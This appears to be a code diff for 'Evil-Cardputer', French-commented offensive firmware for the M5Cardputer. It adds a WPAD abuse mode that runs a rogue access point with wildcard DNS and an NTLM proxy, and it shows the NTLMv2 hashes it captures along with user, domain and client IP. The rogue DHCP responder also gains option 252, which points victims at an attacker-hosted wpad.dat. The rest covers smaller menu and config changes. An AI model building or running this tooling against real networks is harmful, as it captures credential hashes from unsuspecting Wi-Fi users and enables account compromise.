+  // H: 0..359, S/V: 0..255
+  if (S == 0) { r = g = b = V; return; }
+  uint16_t region = H / 60;
+  uint16_t remainder = (H - (region * 60)) * 255 / 60;
+
+  uint8_t p = (V * (255 - S)) / 255;
+  uint8_t q = (V * (255 - ((S * remainder) / 255))) / 255;
+  uint8_t t = (V * (255 - ((S * (255 - remainder)) / 255))) / 255;
+
+  switch (region) {
+    default:
+    case 0: r = V; g = t; b = p; break;
+    case 1: r = q; g = V; b = p; break;
+    case 2: r = p; g = V; b = t; break;
+    case 3: r = p; g = q; b = V; break;
+    case 4: r = t; g = p; b = V; break;
+    case 5: r = V; g = p; b = q; break;
+  }
+}
+
+static inline uint16_t hsv565(uint16_t h, uint8_t s, uint8_t v){
+  uint8_t r,g,b; hsv2rgb(h%360, s, v, r, g, b); return rgb565(r,g,b);
+}
+
+// easing pour animations plus “vivantes”
+static inline float easeInOutSine(float x){
+  return -0.5f * (cosf(PI * x) - 1.0f);
+}
+
+
+// ==== WiFi Waves Neo (Glow + Arcs + Sparks) ====
+void showWaitingAnimationNTLM() {
+  auto& d = M5Cardputer.Display;
+  static uint32_t t = 0;              // temps logique (ticks)
+  static bool sparksInit = false;
+
+  // ---- header ----
+  d.fillScreen(TFT_BLACK);
+  d.setTextSize(1.5);
+  d.setTextColor(TFT_WHITE, TFT_BLACK);
+
+  // centre de l'animation
+  const int cx = d.width() / 2;
+  const int cy = d.height() / 2 + 12;
+
+  // ---- halo central (glow) ----
+  // 3 disques concentriques pour effet lumineux
+  for (int i = 3; i >= 1; --i) {
+    uint8_t v = 40 * i;               // intensité décroissante
+    d.fillCircle(cx, cy, 10 + i*4, rgb565(0, v, 120));
+  }
+  d.fillCircle(cx, cy, 6, rgb565(100, 255, 255)); // émetteur
+
+  // ---- ondes circulaires (avec glow “épais”) ----
+  // 4 vagues étalées + dégradé HSV
+  const int maxR = (int)(min(d.width(), d.height()) * 0.9f);
+  for (int i = 0; i < 4; ++i) {
+    // progression (0..1) décalée par i
+    float k = ((t * 0.015f) + i * 0.25f);
+    k = k - floorf(k);                      // wrap 0..1
+    float e = easeInOutSine(k);             // easing pour douceur
+    int R = (int)(e * maxR);
+
+    // épaisseur du “ring” glow
+    int thickness = 5;
+    for (int j = 0; j < thickness; ++j) {
+      int r = R - j;
+      if (r <= 0) continue;
+
+      // teinte qui drift légèrement (cyan → bleu)
+      uint16_t hue = (uint16_t)(180 + 20 * sinf((t*0.01f) + i));
+      uint8_t sat = 255;
+      // luminosité externe plus faible
+      uint8_t val = (uint8_t)max(30, 220 - j * 35);
+      d.drawCircle(cx, cy, r, hsv565(hue, sat, val));
+    }
+  }
+
+  // ---- arcs dynamiques (segments WiFi “stylisés”) ----
+  // 3 arcs qui tournent comme un “sweep”
+  float sweep = (t * 0.05f);
+  for (int a = 0; a < 3; ++a) {
+    float base = sweep + a * 1.8f;        // décalage entre arcs
+    int r = 18 + a * 12;                  // distance à l’émetteur
+    // chaque arc couvre ~90° avec 2 épaisseurs
+    for (int thick = 0; thick < 2; ++thick) {
+      float start = base + thick * 0.05f;
+      float end   = start + 1.6f;         // largeur angulaire
+      // parcourir l’arc en petits pas
+      for (float ang = start; ang <= end; ang += 0.05f) {
+        int x = cx + (int)(cosf(ang) * r);
+        int y = cy + (int)(sinf(ang) * r);
+        // intensité en fonction de la proximité du centre de l’arc
+        float mid = (start + end) * 0.5f;
+        float falloff = 1.0f - fabsf(ang - mid) / (end - start);
+        uint8_t v = (uint8_t)(150 + 100 * falloff);
+        d.drawPixel(x, y, hsv565(190, 180, v));
+      }
+    }
+  }
+
+  // ---- particules étincelles (surgissent / s’éteignent) ----
+  struct Spark { float x,y,dx,dy,life; };
+  static Spark S[12];
+  if (!sparksInit) {
+    for (auto &s : S) {
+      s.x = cx; s.y = cy;
+      float a = (random(0, 628)) / 100.0f; // 0..6.28
+      float v = 0.7f + (random(0, 30) / 100.0f);
+      s.dx = cosf(a) * v; s.dy = sinf(a) * v;
+      s.life = random(20, 80);
+    }
+    sparksInit = true;
+  }
+
+  // update + draw
+  for (auto &s : S) {
+    // progression
+    s.x += s.dx; s.y += s.dy;
+    s.life -= 1.0f;
+
+    // fade
+    float f = max(0.0f, s.life / 80.0f);
+    uint8_t v = (uint8_t)(200 * f + 30);
+
+    // rendu
+    uint16_t c = hsv565(185, 200, v);
+    d.drawPixel((int)s.x, (int)s.y, c);
+    // mini glow
+    if ((int)s.life % 2 == 0) {
+      d.drawPixel((int)s.x+1, (int)s.y, c);
+      d.drawPixel((int)s.x, (int)s.y+1, c);
+    }
+
+    // respawn si mort ou hors écran
+    if (s.life <= 0 || s.x < 0 || s.y < 0 || s.x >= d.width() || s.y >= d.height()) {
+      s.x = cx; s.y = cy;
+      float a = (random(0, 628)) / 100.0f;
+      float v2 = 0.9f + (random(0, 50) / 100.0f);
+      s.dx = cosf(a) * v2; s.dy = sinf(a) * v2;
+      s.life = random(30, 90);
+    }
+  }
+
+  d.setCursor(5, 5);
+  d.print("Waiting WPAD.DAT on \n " + clonedSSID);
+  
+  // ---- footer discrète ----
+  d.setTextSize(1);
+  d.setTextColor(TFT_DARKGREY, TFT_BLACK);
+  d.setCursor(5, d.height() - 12);
+  d.print("Press BACKSPACE to exit");
+
+  // avance temps
+  t++;
+}
+
+
+
+
+
+void updateHashUiNTLM() {
+  auto& d = M5Cardputer.Display;
+
+  // only update if new info
+  if (ntlmLastUser == uiLastUser &&
+      ntlmLastDomain == uiLastDomain &&
+      ntlmLastClient == uiLastClient &&
+      ntlmHashCount == uiLastCount) {
+    return; // nothing changed -> skip redraw
+  }
+
+  // update cache
+  uiLastUser   = ntlmLastUser;
+  uiLastDomain = ntlmLastDomain;
+  uiLastClient = ntlmLastClient;
+  uiLastCount  = ntlmHashCount;
+
+  d.fillScreen(BLACK);
+
+  // 1) NTLM count
+  d.setTextSize(1.3);
+  d.setTextColor(WHITE, BLACK);
+  d.setCursor(5, 5);
+  d.print("NTLMv2: ");
+  d.setTextSize(2);
+  d.print(ntlmHashCount);
+
+  // 2) User
+  d.setTextSize(1.3);
+  d.setCursor(5, 35);
+  d.print("User: ");
+  d.setTextSize(2);
+  d.print(ntlmLastUser);
+
+  // 3) Domain
+  d.setTextSize(1.3);
+  d.setCursor(5, 65);
+  d.print("Domain: ");
+  d.setTextSize(2);
+  d.print(ntlmLastDomain);
+
+  // 4) Client (IP)
+  d.setTextSize(1.3);
+  d.setCursor(5, 95);
+  d.print("Client: ");
+  d.setTextSize(2);
+  d.print(ntlmLastClient);
+
+  // footer
+  d.setTextSize(1);
+  d.setCursor(5, d.height() - 12);
+  d.setTextColor(TFT_DARKGREY, BLACK);
+  d.print("Press BACKSPACE to exit");
+}
+
+// =================== Setup / Loop ===================
+void wpadAbuse() {
+  M5.Lcd.fillScreen(BLACK);
+  inMenu = false;
+  isOperationInProgress = true;
+  String ssid = clonedSSID.isEmpty() ? "Evil-Cardputer" : clonedSSID;
+
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    WiFi.mode(WIFI_MODE_AP);
+  } else {
+    WiFi.mode(WIFI_MODE_APSTA);
+  }
+
+  const int  channel       = 1;
+  const bool ssid_hidden   = false;
+  const int  max_clients   = 10;
+
+  if (captivePortalPassword.isEmpty()) {
+    WiFi.softAP(ssid.c_str(), nullptr, channel, ssid_hidden, max_clients);
+  } else {
+    WiFi.softAP(ssid.c_str(), captivePortalPassword.c_str(), channel, ssid_hidden, max_clients);
+  }
+
+  ipAP  = WiFi.softAPIP();
+  ipSTA = WiFi.localIP();
+
+  dnsServer.start(53, "*", ipAP);
+  proxy.begin();
+  Serial.println("[+] DNS + Proxy NTLM active");
+
+  while (true) {
+    dnsServer.processNextRequest();
+    WiFiClient c = proxy.available();
+    if (c) handleNTLMClient(c);
+
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      proxy.stop();
+      dnsServer.stop();
+      WiFi.mode(WIFI_MODE_APSTA);
+      waitAndReturnToMenu("Return to menu");
+      return;
+    }
+
+    unsigned long now = millis();
+    if (now - lastRadarUpdate > radarInterval) {
+      lastRadarUpdate = now;
+      if (!ntlmActiveCapture) {
+        showWaitingAnimationNTLM();   // radar fullscreen
+      } else {
+        updateHashUiNTLM();       // redraw only if new data
+      }
+    }
+  }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 void handleSaveFileUpload() {
     HTTPUpload& upload = server.upload();
@@ -4103,6 +5043,7 @@ void showSettingsMenu() {
         options.push_back({"Set Startup Sound", setStartupSound});
         options.push_back({randomOn ? "Random startup Off" : "Random startup On", []() {toggleRandom();}});
         options.push_back({"Save current Portal & SSID", []() { saveCurrentPortalAndSSID(); }});
+        options.push_back({"Set CPU Frequency", setCPUFrequency});
         
         loopOptions(options, false, true, "Settings");
 
@@ -4113,6 +5054,70 @@ void showSettingsMenu() {
     }
     inMenu = true;
 }
+
+
+
+void setCPUFrequency() {
+    std::vector<int> freqs = {80, 160, 240};
+    int currentIndex = 0;
+    bool freqSelected = false;
+    bool needDisplayUpdate = true;
+
+    enterDebounce();
+
+    while (!freqSelected) {
+        if (needDisplayUpdate) {
+            M5.Display.clear();
+            M5.Display.setCursor(0, 0);
+            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+            M5.Display.println("Select CPU Frequency:");
+
+            // --- afficher la fréquence actuelle ---
+            int currentFreq = getCpuFrequencyMhz();
+            M5.Display.setTextColor(TFT_YELLOW, menuBackgroundColor);
+            M5.Display.println("Current: " + String(currentFreq) + " MHz");
+            M5.Display.println(""); // ligne vide avant la liste
+
+            // --- afficher la liste des options ---
+            for (int i = 0; i < freqs.size(); i++) {
+                if (i == currentIndex) {
+                    M5.Display.setTextColor(menuTextFocusedColor);
+                } else {
+                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+                }
+                M5.Display.println(String(freqs[i]) + " MHz");
+            }
+
+            needDisplayUpdate = false;
+        }
+
+        M5.update();
+        M5Cardputer.update();
+
+        if (M5Cardputer.Keyboard.isKeyPressed(';')) { // haut
+            currentIndex = (currentIndex - 1 + freqs.size()) % freqs.size();
+            needDisplayUpdate = true;
+        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // bas
+            currentIndex = (currentIndex + 1) % freqs.size();
+            needDisplayUpdate = true;
+        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+            int selectedFreq = freqs[currentIndex];
+            setCpuFrequencyMhz(selectedFreq);
+            saveConfigParameter("cpu_freq", selectedFreq); // sauvegarde
+            M5.Display.fillScreen(menuBackgroundColor);
+            M5.Display.setCursor(0, M5.Display.height() / 2);
+            M5.Display.print("CPU set to " + String(selectedFreq) + " MHz");
+            Serial.println("CPU Frequency changed to " + String(selectedFreq) + " MHz");
+            delay(1000);
+            freqSelected = true;
+        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+            freqSelected = true;
+        }
+
+        delay(150); // anti-rebond
+    }
+}
+
 
 void setGPSBaudrate() {
     // Liste des baudrates disponibles
@@ -4859,12 +5864,51 @@ void saveClonedSSIDConfig(const String &ssid) {
     Serial.println(F("saveClonedSSIDConfig: write error"));
   }
 }
+// Sauvegarde/maj de cloned_ssid dans /config/config.txt
+void savePasswordConfig(const String &pass) {
+  if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);
+
+  String content = "";
+  bool found = false;
+
+  File f = SD.open(configFilePath, FILE_READ);
+  if (f) {
+    while (f.available()) {
+      String line = f.readStringUntil('\n');
+      if (line.startsWith("portal_password=")) {
+        content += "portal_password=" + pass + "\n";
+        found = true;
+      } else {
+        content += line + "\n";
+      }
+    }
+    f.close();
+  }
+
+  if (!found) content += "portal_password=" + ssid + "\n";
+
+  f = SD.open(configFilePath, FILE_WRITE);
+  if (f) {
+    f.print(content);
+    f.close();
+    Serial.println("portal_password saved: " + ssid);
+  } else {
+    Serial.println(F("portal_password: write error"));
+  }
+}
 
 // Wrapper appelé par le menu Settings
 void saveCurrentPortalAndSSID() {
   Serial.println(F("Saving portal_file & cloned_ssid to config.txt"));
   savePortalFileConfig(selectedPortalFile);
   saveClonedSSIDConfig(clonedSSID);
+  savePasswordConfig(captivePortalPassword);
+  M5.Display.fillScreen(menuBackgroundColor);
+  M5.Display.setCursor(10, 10);
+  M5.Display.println("Portal : " + selectedPortalFile.substring(12));
+  M5.Display.println("SSID : " + clonedSSID);
+  M5.Display.println("Password : " + captivePortalPassword);
+  delay(2000);
   waitAndReturnToMenu("Config saved"); // même UX que le reste du projet
 }
 
@@ -4978,11 +6022,15 @@ void restoreConfigParameter(String key) {
           } else if (key == "cloned_ssid") {
             clonedSSID = stringValue;
             Serial.println("Cloned SSID restored to " + clonedSSID);
+          } else if (key == "portal_password") {
+            captivePortalPassword = stringValue;
+            Serial.println("Portal password restored to " + captivePortalPassword);
           }
           keyFound = true;
           break;
         }
       }
+      
       configFile.close();
 
       // Defaults si clé non trouvée
@@ -5022,8 +6070,13 @@ void restoreConfigParameter(String key) {
           snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
           currentNick[sizeof(currentNick) - 1] = '\0';
           Serial.println("Default Nickname generated: " + String(currentNick));
-        } else if (key == "portal_file") { selectedPortalFile = "/sites/normal.html"; }
-          else if (key == "cloned_ssid") { clonedSSID = "Evil-Cardputer"; }
+        } else if (key == "portal_file") { 
+          selectedPortalFile = "/sites/normal.html"; 
+        } else if (key == "cloned_ssid") { 
+          clonedSSID = "Evil-Cardputer"; 
+        } else if (key == "portal_password") { 
+          captivePortalPassword = ""; 
+        }
       }
 
       // Application booléens
@@ -5075,8 +6128,13 @@ void restoreConfigParameter(String key) {
       snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
       currentNick[sizeof(currentNick) - 1] = '\0';
       Serial.println("Default Nickname generated: " + String(currentNick));
-    } else if (key == "portal_file") { selectedPortalFile = "/sites/normal.html"; }
-      else if (key == "cloned_ssid") { clonedSSID = "Evil-Cardputer"; }
+    } else if (key == "portal_file") { 
+      selectedPortalFile = "/sites/normal.html"; 
+    } else if (key == "cloned_ssid") { 
+      clonedSSID = "Evil-Cardputer"; 
+    } else if (key == "portal_password") { 
+      captivePortalPassword = ""; 
+    }
   }
 }
 
@@ -5655,7 +6713,7 @@ void listProbes() {
         Serial.println("SSID selected: " + probes[currentListIndex]);
         clonedSSID = probes[currentListIndex];
         waitAndReturnToMenu(probes[currentListIndex] + " selected");
-        return; // Sortie de la fonction après sélection //here
+        return; // Sortie de la fonction après sélection
       } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
         inMenu = true;
         drawMenu();
@@ -6118,7 +7176,7 @@ void probeAttack() {
   Serial.println(F("-------------------"));
   Serial.println(F("Stopping Probe Attack"));
   Serial.println(F("-------------------"));
-  //restoreOriginalWiFiSettings(); //here 
+  //restoreOriginalWiFiSettings();
   useCustomProbes = false;
   inMenu = true;
   drawMenu();
@@ -6552,9 +7610,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.3"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.4"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.3"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.4"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -11230,7 +12288,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.4.3,model=Cardputer,release=v1.4.3,"
+  "WigleWifi-1.4,appRelease=v1.4.4,model=Cardputer,release=v1.4.4,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -12837,14 +13895,12 @@ void fetchWebsites(const std::vector<IPAddress>& hostslist, const std::map<IPAdd
     }
 }
 
-
 // Fonction pour identifier si le port est susceptible de servir un site web
 bool isLikelyWebPort(int port) {
     // Liste des ports courants utilisés pour des services web
     std::vector<int> webPorts = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 7001};
     return std::find(webPorts.begin(), webPorts.end(), port) != webPorts.end();
 }
-
 
 // Fonction pour récupérer le contenu HTML d'une page avec gestion des redirections
 String getHttpContentWithRedirect(String url) {
@@ -13060,6 +14116,7 @@ void ListNetworkAnalysis() {
 */
 
 bool isBackspacePressed() {
+  M5Cardputer.update();
   if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
     Serial.println(F("Touche BACKSPACE détectée, retour au menu."));
     return true;
@@ -13378,32 +14435,38 @@ void rogueDHCP() {
 
       uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
 
+      uint8_t offeredIpSuffix = 0; // suffixe IP attribué
+
       if (messageTypeRogue == 1) { // DHCP Discover
         Serial.println(F("DHCP Discover received. Preparing Offer..."));
         updateDisplay("Discover. Preparing Offer...");
-        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
 
-        // Send the DHCP Offer
-        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
+
+        // Send the DHCP Offer (broadcast)
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
         Serial.println(F("DHCP Offer sent."));
         updateDisplay("Offer sent.");
 
       } else if (messageTypeRogue == 3) { // DHCP Request
         Serial.println(F("DHCP Request received. Preparing ACK..."));
         updateDisplay("Request. Preparing ACK...");
-        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
 
-        // Send the DHCP ACK
-        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
+
+        // Send the DHCP ACK (unicast vers client)
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
         Serial.println(F("DHCP ACK sent."));
         updateDisplay("ACK sent.");
       }
     }
   }
+
   if (isCaptivePortalOn) {
     dnsServer.start(53, "*", WiFi.softAPIP()); // restart DNS redirect
   }
 }
+
 
 uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
   // DHCP options start after 240 bytes
@@ -13451,64 +14514,56 @@ void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requ
   }
 }
 
-void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue) {
-  // Set BOOTREPLY
-  packetRogue[0] = 2; // BOOTREPLY
+void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue, uint8_t &offeredIpSuffix) {
+  // BOOTREPLY
+  packetRogue[0] = 2;
 
-  // Extract client MAC address
+  // Extraire la MAC du client
   uint8_t clientMac[6];
   memcpy(clientMac, &packetRogue[28], 6);
 
-  // Variables to hold requested IP and server identifier
-  IPAddress requestedIP(0, 0, 0, 0);
-  IPAddress serverID(0, 0, 0, 0);
+  // Réinjecter CHADDR correctement (16 octets total)
+  memcpy(&packetRogue[28], clientMac, 6);
+  memset(&packetRogue[34], 0, 10);
 
-  // Parse DHCP options to get requested IP and server identifier
+  // Requested IP et Server ID
+  IPAddress requestedIP(0,0,0,0);
+  IPAddress serverID(0,0,0,0);
   parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);
 
-  uint8_t offeredIpSuffix = 0;
+  offeredIpSuffix = 0;
 
-  if (messageTypeRogue == 2) { // DHCP Offer
-    // Allocate an IP address for the client
+  // Allocation IP
+  if (messageTypeRogue == 2) { // OFFER
     offeredIpSuffix = allocateIpAddress(clientMac);
     if (offeredIpSuffix == 0) {
       Serial.println(F("No available IP addresses."));
       updateDisplay("No available IPs.");
       return;
     }
-  } else if (messageTypeRogue == 5) { // DHCP ACK
-    // Client is requesting a specific IP
-    if (requestedIP != IPAddress(0, 0, 0, 0)) {
-      if (requestedIP[0] == rogueIPRogue[0] && requestedIP[1] == rogueIPRogue[1] && requestedIP[2] == rogueIPRogue[2]) {
-        // Check if requested IP is in our available IPs
+  } else if (messageTypeRogue == 5) { // ACK
+    if (requestedIP != IPAddress(0,0,0,0)) {
+      if (requestedIP[0] == rogueIPRogue[0] &&
+          requestedIP[1] == rogueIPRogue[1] &&
+          requestedIP[2] == rogueIPRogue[2]) {
         uint8_t requestedSuffix = requestedIP[3];
-        // Check if requestedSuffix is in availableIpSuffixesRogue[]
-        bool ipAvailable = false;
-        for (int i = 0; i < numAvailableIps; i++) {
+        for (int i=0;i<numAvailableIps;i++) {
           if (availableIpSuffixesRogue[i] == requestedSuffix) {
-            // Check if IP is already allocated
             if (!ipAllocatedRogue[i]) {
-              // Allocate the IP to the client
               ipAllocatedRogue[i] = true;
-              // Store the client info
-              for (int j = 0; j < MAX_CLIENTS; j++) {
-                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6) == 0) {
+              for (int j=0;j<MAX_CLIENTS;j++) {
+                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6)==0) {
                   memcpy(clients[j].mac, clientMac, 6);
                   clients[j].ipSuffix = requestedSuffix;
                   break;
                 }
               }
               offeredIpSuffix = requestedSuffix;
-              ipAvailable = true;
               break;
             } else {
-              // IP is already allocated
-              // Check if it's allocated to the same client
-              for (int j = 0; j < MAX_CLIENTS; j++) {
-                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6) == 0) {
-                  // IP is allocated to the same client
+              for (int j=0;j<MAX_CLIENTS;j++) {
+                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6)==0) {
                   offeredIpSuffix = requestedSuffix;
-                  ipAvailable = true;
                   break;
                 }
               }
@@ -13517,7 +14572,6 @@ void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t mes
         }
       }
     } else {
-      // No requested IP, allocate IP
       offeredIpSuffix = allocateIpAddress(clientMac);
       if (offeredIpSuffix == 0) {
         Serial.println(F("No available IP addresses."));
@@ -13527,90 +14581,109 @@ void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t mes
     }
   }
 
-  // Set your offered IP address (yiaddr)
+  // yiaddr (IP client attribuée)
   packetRogue[16] = rogueIPRogue[0];
   packetRogue[17] = rogueIPRogue[1];
   packetRogue[18] = rogueIPRogue[2];
   packetRogue[19] = offeredIpSuffix;
 
-  // Display the allocated IP address
-  char allocatedIpMessage[50];
-  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d", rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
-  updateDisplay(allocatedIpMessage);
-
-  // Set the server IP address (siaddr)
+  // siaddr (IP serveur)
   packetRogue[20] = rogueIPRogue[0];
   packetRogue[21] = rogueIPRogue[1];
   packetRogue[22] = rogueIPRogue[2];
   packetRogue[23] = rogueIPRogue[3];
 
-  // DHCP Magic cookie
+  packetRogue[10] = 0x80; 
+  packetRogue[11] = 0x00;
+
+  // DHCP Magic Cookie
   packetRogue[236] = 0x63;
   packetRogue[237] = 0x82;
   packetRogue[238] = 0x53;
   packetRogue[239] = 0x63;
 
-  // Start adding DHCP options
   int optionIndexRogue = 240;
 
-  // DHCP Message Type (Option 53)
-  packetRogue[optionIndexRogue++] = 53;   // Option
-  packetRogue[optionIndexRogue++] = 1;    // Length
-  packetRogue[optionIndexRogue++] = messageTypeRogue; // Message Type
+  // DHCP Message Type (53)
+  packetRogue[optionIndexRogue++] = 53;
+  packetRogue[optionIndexRogue++] = 1;
+  packetRogue[optionIndexRogue++] = messageTypeRogue;
 
-  // Server Identifier (Option 54)
-  packetRogue[optionIndexRogue++] = 54;   // Option
-  packetRogue[optionIndexRogue++] = 4;    // Length
+  // Server Identifier (54)
+  packetRogue[optionIndexRogue++] = 54;
+  packetRogue[optionIndexRogue++] = 4;
   packetRogue[optionIndexRogue++] = rogueIPRogue[0];
   packetRogue[optionIndexRogue++] = rogueIPRogue[1];
   packetRogue[optionIndexRogue++] = rogueIPRogue[2];
   packetRogue[optionIndexRogue++] = rogueIPRogue[3];
 
-  // Subnet Mask (Option 1)
-  packetRogue[optionIndexRogue++] = 1;    // Option
-  packetRogue[optionIndexRogue++] = 4;    // Length
+  // Subnet Mask (1)
+  packetRogue[optionIndexRogue++] = 1;
+  packetRogue[optionIndexRogue++] = 4;
   packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
   packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
   packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
   packetRogue[optionIndexRogue++] = currentSubnetRogue[3];
 
-  // Router (Gateway) (Option 3)
-  packetRogue[optionIndexRogue++] = 3;    // Option
-  packetRogue[optionIndexRogue++] = 4;    // Length
+  // Router (3)
+  packetRogue[optionIndexRogue++] = 3;
+  packetRogue[optionIndexRogue++] = 4;
   packetRogue[optionIndexRogue++] = rogueIPRogue[0];
   packetRogue[optionIndexRogue++] = rogueIPRogue[1];
   packetRogue[optionIndexRogue++] = rogueIPRogue[2];
   packetRogue[optionIndexRogue++] = rogueIPRogue[3];
 
-  // DNS Server (Option 6)
-  packetRogue[optionIndexRogue++] = 6;    // Option
-  packetRogue[optionIndexRogue++] = 4;    // Length
+  // DNS (6)
+  packetRogue[optionIndexRogue++] = 6;
+  packetRogue[optionIndexRogue++] = 4;
   packetRogue[optionIndexRogue++] = currentDNSRogue[0];
   packetRogue[optionIndexRogue++] = currentDNSRogue[1];
   packetRogue[optionIndexRogue++] = currentDNSRogue[2];
   packetRogue[optionIndexRogue++] = currentDNSRogue[3];
 
-  // Lease Time (Option 51)
-  packetRogue[optionIndexRogue++] = 51;   // Option
-  packetRogue[optionIndexRogue++] = 4;    // Length
+  // Lease Time (51)
+  packetRogue[optionIndexRogue++] = 51;
+  packetRogue[optionIndexRogue++] = 4;
   packetRogue[optionIndexRogue++] = 0x00;
   packetRogue[optionIndexRogue++] = 0x01;
   packetRogue[optionIndexRogue++] = 0x51;
-  packetRogue[optionIndexRogue++] = 0x80; // 1-day lease time (86400 seconds)
-
+  packetRogue[optionIndexRogue++] = 0x80; // 86400s
+  
+  // WPAD (252) → URL du proxy
+  const char wpadUrl[] = "http://evilm5.lan/wpad.dat";
+  size_t wpadLen = strlen(wpadUrl);
+  packetRogue[optionIndexRogue++] = 252;
+  packetRogue[optionIndexRogue++] = wpadLen;
+  memcpy(&packetRogue[optionIndexRogue], wpadUrl, wpadLen);
+  optionIndexRogue += wpadLen;
+  
   // End Option
   packetRogue[optionIndexRogue++] = 255;
 
-  // Update packet size
+  // Padding alignement 4 octets
+  while (optionIndexRogue % 4 != 0) {
+    packetRogue[optionIndexRogue++] = 0;
+  }
+
   packetSizeRogue = optionIndexRogue;
+
+  // Affichage IP attribuée
+  char allocatedIpMessage[50];
+  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d",
+          rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
+  updateDisplay(allocatedIpMessage);
 }
 
-void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue) {
-  // Send the packet to the client port (68)
+
+
+void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue, bool isAck, uint8_t offeredIpSuffix) {
+  // Toujours en broadcast car le client n'a pas encore configuré son IP
   udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
   udp.write(packetRogue, packetSizeRogue);
   udp.endPacket();
 }
+
+
 
 uint8_t allocateIpAddress(uint8_t *clientMac) {
   // Check if this client already has an IP allocated
@@ -14402,27 +15475,31 @@ void rogueDHCPAuto() {
       udp.read(packetBufferRogue, packetSizeRogue);
 
       uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
-
+      uint8_t offeredIpSuffix = 0;
+      
       if (messageTypeRogue == 1) { // DHCP Discover
         Serial.println(F("DHCP Discover received. Preparing Offer..."));
         updateDisplay("Discover. Preparing Offer...");
-        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
-
-        // Send the DHCP Offer
-        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+      
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
+      
+        // Send the DHCP Offer (broadcast)
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
         Serial.println(F("DHCP Offer sent."));
         updateDisplay("Offer sent.");
-
+      
       } else if (messageTypeRogue == 3) { // DHCP Request
         Serial.println(F("DHCP Request received. Preparing ACK..."));
         updateDisplay("Request. Preparing ACK...");
-        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
-
-        // Send the DHCP ACK
-        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+      
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
+      
+        // Send the DHCP ACK (unicast vers client)
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
         Serial.println(F("DHCP ACK sent."));
